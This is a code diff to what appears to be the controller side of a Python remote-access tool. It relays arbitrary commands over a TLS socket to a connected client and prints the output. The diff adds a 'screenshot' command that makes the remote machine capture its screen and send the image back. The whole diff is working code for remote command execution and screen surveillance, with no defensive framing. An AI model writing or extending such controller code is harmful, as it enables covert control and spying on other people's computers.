@@ -30,9 +30,20 @@ with context.wrap_socket(server_socket, server_side=True) as ssl_socket:
         if command.lower() == 'exit':
             client_socket.send(b'exit')
             break
-        client_socket.send(command.encode())
-        result = client_socket.recv(1024).decode()
-        print(result)
+        elif command.lower() == 'screenshot':
+            client_socket.send(b'screenshot')
+            with open('screenshot.png', 'wb') as f:
+                while True:
+                    data = client_socket.recv(1024)
+                    if data.endswith(b'DONE'):
+                        f.write(data[:-4])
+                        break
+                    f.write(data)
+            print("[+] Screenshot received and saved as 'screenshot.png'")
+        else:
+            client_socket.send(command.encode())
+            result = client_socket.recv(1024).decode()
+            print(result)
 
     client_socket.close()
 server_socket.close()
